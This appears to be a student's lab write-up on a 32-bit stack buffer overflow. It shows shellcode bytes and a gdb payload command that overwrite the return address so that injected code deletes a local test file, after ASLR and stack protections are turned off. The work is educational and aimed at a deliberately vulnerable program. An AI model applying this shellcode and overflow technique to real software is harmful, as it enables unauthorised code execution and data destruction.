# DELETE DUMMYFILE USING INJECTION CODE

## Target

- delete `dummyfile` file by using `buffer overflow` to `inject code` into `vuln.c` file

## Prepare for lab

- create `dummyfile` without format using:

  > touch dummyfile

![dummyfile](https://github.com/user-attachments/assets/db1e9ab7-52b7-474e-8a01-4991a18a1ef4)

- change to shell `/bin/sh`

  > sudo ln -sf /bin/zsh /bin/sh

- turn off OS’s address space layout randomization:

  > sudo sysctl -w kernel.randomize_va_space=0

![image](https://github.com/user-attachments/assets/29fe8640-cdb7-4a9d-9524-7838be81ed3d)

- compile and link the file_del.asm code using 2 commands:

  > nasm -g -f elf file_del.asm

  > ld -m elf_i386 -o file_del file_del.o

![image](https://github.com/user-attachments/assets/c7e84fbb-52b0-4863-af0c-b4bc439d2abf)

- hexstring of my file_del.asm using:

  > for i in $(objdump -d file_del |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo

![image](https://github.com/user-attachments/assets/f23930c5-ad9e-406e-9e94-eb87887c517a)

- but we don't need `\xdummyfile` at the end, so we have:

  > \xeb\x13\xb8\x0a\x00\x00\x00\xbb\x7a\x80\x04\x08\xcd\x80\xb8\x01\x00\x00\x00\xcd\x80\xe8\xe8\xff\xff\xff\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65\x00

- stack frame of `vuln.c`.

![image](https://github.com/user-attachments/assets/64d7ba16-29b2-40fe-a45d-5631641d684a)

- compile the vuln.c program using:
  > gcc -g vuln.c -o vuln.out -fno-stack-protector -z execstack -mpreferred-stack-boundary=2

## execution.

- I will set two breakpoint at `0x804843e` and `0x804846b`.

![image](https://github.com/user-attachments/assets/ae4ba6c8-5454-4496-b6e0-719d3f49bac0)

- If we want to execute the `file_del.asm` code on stack, we need to overflow the buffer so that `return address` points to the top of `esp` where the code will lies. It will be `36 bytes of hexstring + 32 padding bytes + 4 bytes of esp`. I will use `\xff\xff\xff\xff` to identify `ebp`, use command:

  > r $(python –c “print(‘\xeb\x13\xb8\x0a\x00\x00\x00\xbb\x7a\x80\x04\x08\xcd\x80\xb8\x01\x00\x00\x00\xcd\x80\xe8\xe8\xff\xff\xff\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65\x00’ + ‘a’\*32 + ‘\xff\xff\xff\xff)”)

![image](https://github.com/user-attachments/assets/1253f489-0be7-4d8e-92cb-df4819e21b08)

- the address red is `ebp`.
- the address green is `Return Address`.

![image](https://github.com/user-attachments/assets/0814d4df-c394-47e2-a76a-17f833570a61)

- Comparing to the hexstring, the first three 3 values are the same buf after that everything is different and `Return Address` is not `\xff\xff\xff\xff`.

  1. we have `\x0a(/n)` in the hex string.
  2. `\x00` have problem in 32 bits register `eax`.

![image](https://github.com/user-attachments/assets/baa0c88c-3856-40f6-94cb-733da69a078b)

- In the `file_del.asm`:

![image](https://github.com/user-attachments/assets/33957858-16ac-43a9-81b3-2b2dca0a8288)

- The `\x0a` comes from the line `move eax, 10`.
- The `\x00` comes from `eax`. Because `eax` is 32 bits register so when we move a small value into `eax`, the high bits of this register (24 bits) will automatically be filled with `0`.

- We need to edit a few lines of code in `file_del.asm`:

  - Use `al` register. Because this is the lowest 8-bit part of the `eax` register. When you move a value into `al`, only 8-bits (1 byte) are changed, not affecting the rest of `eax`.
  - Clear the `eax` register using command:
    > xor eax, eax
  - Replace `move eax, 10` with:

    > mov al, 8

    > add al, 2

![image](https://github.com/user-attachments/assets/c2221627-8d88-4b5a-8489-64ee31d85943)

- We recompile `file_del.asm`, get the new hexstring and run the program.

  - The new hexstring is `\xeb\x13\x31\xc0\xb0\x08\x04\x02\xbb\x7a\x80\x04\x08\xcd\x80\x31\xc0\xb0\x01\xcd\x80\xe8\xe8\xff\xff\xff\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65\x00`

![image](https://github.com/user-attachments/assets/b30f4479-effe-45e9-9c94-c340c5c63c7c)

- At the end still `\x00`, I will change it to `\x01`. Now, the `Return Address` is `\xff\xff\xff\xff`.

![image](https://github.com/user-attachments/assets/0a7c8de4-3c63-4a73-9dd2-14ab107eb0e0)

- We will change the address `0xffffd63c`(the first `\xff`) to the address of `esp` `0xffffd5f8`, set the address `0xffffd61b` to `\x00` and `continue`.

![image](https://github.com/user-attachments/assets/6e88f068-8961-42ff-b1d6-d0a8adb0c714)

![image](https://github.com/user-attachments/assets/e00d6d0f-26ba-44be-9078-83cfaae87aec)

- But dummyfile has not been deleted yet!

- Look at `file_del`.

![image](https://github.com/user-attachments/assets/d7cebb4f-7810-415c-b5a2-8636bae20358)

- `dummyfile` is stored at address `0x0804807a` including bytes `64 75 6d 6d 79 66 69 6c 65 00`. The command `mov ebx,_filename` causes the `ebx` register to `point to the address of _filename` here which is `0x0804807a`. What we just "deleted" is to make the `ebx` register `no longer point to the address of _filename`, not delete the `dummyfile`. So we need to `set the address of dummyfile in the program to the address of ebx`.

![image](https://github.com/user-attachments/assets/dbfc0665-5987-4388-bc97-1c977203a004)
![image](https://github.com/user-attachments/assets/41ceb0ba-04c6-4e1d-9d61-f5583f89664b)

- `dummyfile` has been deleted. The lab is done.
